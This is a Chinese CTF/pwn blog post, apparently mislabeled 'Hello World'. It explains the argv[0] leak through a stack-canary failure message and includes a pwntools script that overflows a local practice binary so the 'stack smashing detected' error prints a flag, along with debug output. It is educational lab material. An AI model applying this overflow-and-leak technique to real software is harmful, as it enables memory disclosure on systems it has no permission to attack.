---
layout: post
title: 'Hello World'
date: 2019-01-01
tags: helloworld
---

> If I were you.

<h2>0x00:函数原理源码</h2>
<p>在程序添加了canary保护后，如果我们读取的bof覆盖了对应的值时，程序就会报错，我们可以利用报错信息。</p>
<p>程序在启动canary保护之后，如果发现canary被修改的话，程序就会执行__stack_chk_fail函数来打印argv[0]指针所指向的字符串，正常情况下，这个指针指向程序名。</p>



```
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");//这里简单理解成打印出报错信息即可，也就是可     以泄露
}
```


<h2>0x01:命令行参数</h2>
<p>main(int argc,char *argv[ ])

1.argc为整数

2.argv为指针的指针（可理解为：char **argv or: char *argv[] or: char argv[][]   ，argv是一个指针数组）

　注：main()括号内是固定的写法。

 

3.下面给出一个例子来理解这两个参数的用法：

　假设程序的名称为prog，

   当只输入prog，则由操作系统传来的参数为：

   argc=1,表示只有一程序名称。

   argc只有一个元素，argv[0]指向输入的程序路径及名称：./prog

 

   当输入prog para_1，有一个参数，则由操作系统传来的参数为：

   argc=2，表示除了程序名外还有一个参数。 

   argv[0]指向输入的程序路径及名称。

   argv[1]指向参数para_1字符串。

 

   当输入prog para_1 para_2 有2个参数，则由操作系统传来的参数为：

   argc=3，表示除了程序名外还有2个参数。

   argv[0]指向输入的程序路径及名称。

   argv[1]指向参数para_1字符串。

   argv[2]指向参数para_2字符串。

 

4.void    main(    int    argc,    char    *argv[]    ) 

   char    *argv[]    :    argv 是一个指针数组，他的元素个数是argc，存放的是指向每一个参数的指针</p>

```
    chen@ubuntu:~$ ./ex0 "hello"
```
<p>就命令行参数而言，ex0是程序名第一个参数，hello是命令行的第二个参数，都处存在数组中</p>

```
gcc --args ./ex0 "hello" //args 其实就是把后面的参数当成命令行参数，存在栈上
                          //其实是下图的argv[0]与argv[1],其实是存储在stack上
```
![](https://img2020.cnblogs.com/blog/1919808/202004/1919808-20200401092833920-811767470.png)

```
tel  //栈回溯，有点像解引用
p system //之类的是打印出符号的地址
```

![](https://img2020.cnblogs.com/blog/1919808/202004/1919808-20200401093655669-247767350.png)

<h2>0x03：泄露flag</h2>

![](https://img2020.cnblogs.com/blog/1919808/202004/1919808-20200401165758772-325673403.png)

<p>正常情况下，p __libc_argv应该打印出栈地址，但不出来我就stack 100找到了</p>

![](https://img2020.cnblogs.com/blog/1919808/202004/1919808-20200401170243413-140902987.png)


![](https://img2020.cnblogs.com/blog/1919808/202004/1919808-20200401165917073-1896215639.png)

<p>接下来就是修改栈指针指向flag,之后再栈溢出触发报错</p>

![](https://img2020.cnblogs.com/blog/1919808/202004/1919808-20200401170541963-318442170.png)

<p>就泄露夺得自己写的flag</p>
<p>0x04:脚本层面</p>

```
from pwn import *

#p = gdb.debug(args=['./ex0'],gdbscript='r')

p=process('./ex0')



#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']



context.log_level='debug'

flag = 0x0804A060

payload = p32(0x0804A060)*0x80



gdb.attach(proc.pidof(p)[0],gdbscript='b *0x804853d')



p.sendline(payload)

pause()

p.recvuntil("}") //大部分flag以}结尾，当然这样写p.recvall()或p.recvline()都可以

```
<p>细节说明：此题是想在执行python的那个界面看到flag,所以新打开的界面关了，在空格即可</p>

```
[+] Starting local process './ex0': pid 3095
[DEBUG] Wrote gdb script to '/tmp/pwnseNWO4.gdb'
    file "/home/chen/ex0"
    b *0x804853d
[*] running in new terminal: /usr/bin/gdb -q  "/home/chen/ex0" 3095 -x "/tmp/pwnseNWO4.gdb"
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "/home/chen/ex0" 3095 -x "/tmp/pwnseNWO4.gdb"']
[+] Waiting for debugger: Done
[DEBUG] Sent 0x201 bytes:
    00000000  60 a0 04 08  60 a0 04 08  60 a0 04 08  60 a0 04 08  │`···│`···│`···│`···│
    *
    00000200  0a                                                  │·│
    00000201
[*] Paused (press any to continue)
```
<p>此处即可在关掉调试界面空格</p>

```
[*] Process './ex0' stopped with exit code -6 (SIGABRT) (pid 3095)
[DEBUG] Received 0x38 bytes:
    '*** stack smashing detected ***: {we_ha_we}\n'
    ' terminated\n'
```
